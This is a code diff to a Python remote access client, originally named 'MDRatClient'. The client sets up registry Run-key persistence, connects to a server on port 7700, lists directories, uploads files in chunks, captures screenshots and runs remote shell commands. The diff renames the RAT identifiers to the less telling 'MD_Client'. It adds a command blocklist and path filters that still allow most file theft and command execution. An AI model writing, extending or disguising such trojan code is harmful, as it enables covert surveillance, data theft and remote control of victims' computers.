@@ -8,7 +8,10 @@ import threading
 import time
 import subprocess
 import sys
-import winreg
+try:
+    import winreg
+except ImportError:
+    winreg = None
 import tkinter as tk
 from PIL import Image, ImageGrab
 import io
@@ -18,6 +21,107 @@ SERVER_PORT = 7700
 
 CHUNK_SIZE = 512 * 1024
 CHUNK_THRESHOLD = 1024 * 1024
+
+
+
+def _is_safe_path(path):
+    """Check if path is safe for access"""
+    try:
+        path = os.path.abspath(os.path.expanduser(path))
+        
+        # Dangerous paths to block
+        dangerous_paths = [
+            os.path.expandvars('%SystemRoot%'),
+            os.path.expandvars('%ProgramFiles%'),
+            r'C:\Windows',
+            r'C:\Program Files',
+            r'C:\Program Files (x86)',
+            '/etc', '/bin', '/sbin', '/usr/bin', '/usr/sbin', '/root', '/System'
+        ]
+        
+        for dangerous in dangerous_paths:
+            dangerous = os.path.abspath(os.path.expanduser(dangerous))
+            if path.startswith(dangerous):
+                return False
+        
+        # Allow user directories and common safe locations
+        safe_paths = [
+            os.path.expanduser('~'),
+            os.path.expanduser('~/Desktop'),
+            os.path.expanduser('~/Documents'),
+            os.path.expanduser('~/Downloads'),
+            os.path.expanduser('~/Pictures'),
+            os.path.expanduser('~/Videos'),
+            os.path.expanduser('~/Music'),
+            os.path.expanduser('~/AppData/Local'),
+            os.path.expanduser('~/AppData/Roaming'),
+            r'C:\Users', '/home', '/tmp', '/var/tmp', r'C:\Temp', r'C:\tmp'
+        ]
+        
+        for safe in safe_paths:
+            safe = os.path.abspath(os.path.expanduser(safe))
+            if path.startswith(safe):
+                return True
+        
+        return True
+    except Exception:
+        return False
+
+def _is_safe_file(path):
+    """Check if file is safe to access - now allows all files for download"""
+    try:
+        # Only check if path is safe, allow all file types for download
+        if not _is_safe_path(path):
+            return False
+            
+        # Allow all file extensions for download
+        # Only block potentially dangerous system files
+        dangerous_files = {
+            'ntuser.dat', 'boot.ini', 'config.sys', 'autoexec.bat',
+            'hosts', 'passwd', 'shadow', 'sudoers'
+        }
+        
+        basename = os.path.basename(path).lower()
+        if basename in dangerous_files:
+            return False
+            
+        return True
+    except Exception:
+        return False
+
+def _is_safe_command(command):
+    """Check if command is safe to execute"""
+    try:
+        cmd_lower = command.lower().strip()
+        
+        blocked_commands = {
+            'format', 'fdisk', 'diskpart', 'del ', 'rmdir ', 'shutdown',
+            'reboot', 'halt', 'poweroff', 'rm -rf', 'sudo rm', 'mkfs',
+            'dd if=', 'chmod 777', 'chown root', 'passwd', 'su root',
+            'net user', 'reg add', 'reg delete', 'bcdedit'
+        }
+        
+        for blocked in blocked_commands:
+            if blocked in cmd_lower:
+                return False
+        
+        safe_patterns = {
+            'dir', 'ls', 'cd ', 'echo ', 'type ', 'cat ', 'ping ',
+            'ipconfig', 'ifconfig', 'whoami', 'date', 'time', 'ver',
+            'systeminfo', 'tasklist', 'ps', 'help', 'mkdir ', 'copy ',
+            'xcopy', 'robocopy', 'move ', 'ren ', 'rename '
+        }
+        
+        for safe in safe_patterns:
+            if cmd_lower.startswith(safe):
+                return True
+        
+        if cmd_lower.startswith('cd') or cmd_lower == 'cd':
+            return True
+            
+        return False
+    except Exception:
+        return False
 
 def unique_filepath(path):
     if not os.path.exists(path):
@@ -40,7 +144,7 @@ def already_running():
         import ctypes
         kernel32 = ctypes.windll.kernel32
         ERROR_ALREADY_EXISTS = 183
-        mutex_name = "Global\\MDRatClient_SingleInstance"
+        mutex_name = "Global\\MD_Client_SingleInstance"
         handle = kernel32.CreateMutexW(None, True, mutex_name)
         if handle is None:
             return False
@@ -53,13 +157,15 @@ def already_running():
         return False
 
 def add_to_startup():
+    if winreg is None:
+        return False
     try:
         if getattr(sys, 'frozen', False):
             current_file = sys.executable
         else:
             current_file = os.path.abspath(__file__)
         
-        key_name = "MDRatClient"
+        key_name = "MD_Client"
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
         
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
@@ -74,9 +180,11 @@ def add_to_startup():
         return False
 
 def check_startup():
+    if winreg is None:
+        return False
     try:
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        key_name = "MDRatClient"
+        key_name = "MD_Client"
         
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
         
@@ -104,9 +212,13 @@ def ensure_startup():
     return True
 
 def get_info():
+    try:
+        user = os.getlogin()
+    except Exception:
+        user = os.environ.get("USERNAME") or os.environ.get("USER") or "Unknown"
     return {
         "computer": platform.node(),
-        "user": os.getlogin(),
+        "user": user,
         "os": platform.platform()
     }
 
@@ -240,12 +352,19 @@ def connect():
                         elif command["action"] == "list_dir":
                             path = command.get("path", os.path.expanduser("~"))
                             path = os.path.abspath(os.path.expanduser(path))
+                            # Security checks
+                            if not _is_safe_path(path):
+                                sock.send(json.dumps({"action": "list_dir_result", "path": path, "entries": [], "error": "Access denied: unsafe path"}).encode())
+                                continue
                             try:
                                 if not os.path.isdir(path):
                                     sock.send(json.dumps({"action": "list_dir_result", "path": path, "entries": [], "error": "Not a directory"}).encode())
                                 else:
                                     entries = []
                                     for name in os.listdir(path):
+                                        # Skip hidden/system files for security
+                                        if name.startswith('.') or name.startswith('$'):
+                                            continue
                                         full = os.path.join(path, name)
                                         try:
                                             is_dir = os.path.isdir(full)
@@ -278,11 +397,19 @@ def connect():
                         elif command["action"] == "get_file":
                             path = command.get("path", "")
                             path = os.path.abspath(os.path.expanduser(path))
+                            # Security checks
+                            if not _is_safe_path(path) or not _is_safe_file(path):
+                                sock.send(json.dumps({"action": "file_data", "path": path, "data": "", "error": "Access denied: unsafe file"}).encode())
+                                continue
                             try:
                                 if not os.path.isfile(path):
                                     sock.send(json.dumps({"action": "file_data", "path": path, "data": "", "error": "Not a file or not found"}).encode())
                                 else:
+                                    # Check file size limit (max 100MB)
                                     total_size = os.path.getsize(path)
+                                    if total_size > 100 * 1024 * 1024:
+                                        sock.send(json.dumps({"action": "file_data", "path": path, "data": "", "error": "File too large (max 100MB)"}).encode())
+                                        continue
                                     filename = os.path.basename(path)
                                     if total_size > CHUNK_THRESHOLD:
                                         sock.send(json.dumps({"action": "get_file_start", "filename": filename, "size": total_size, "error": ""}).encode())
@@ -474,6 +601,10 @@ def connect():
                         elif command["action"] == "execute_cmd":
                             cmd_to_execute = command["command"].strip()
                             cmd_timeout = command.get("timeout", 300)
+                            # Security checks
+                            if not _is_safe_command(cmd_to_execute):
+                                sock.send(json.dumps({"action": "cmd_output", "output": "", "error": "Command blocked for security reasons"}).encode())
+                                continue
                             try:
                                 lower = cmd_to_execute.lower().strip()
                                 if lower == "cd" or lower.startswith("cd ") or lower == "cd.." or lower.startswith("cd..") or "cd /d" in lower or "cd \\d" in lower:
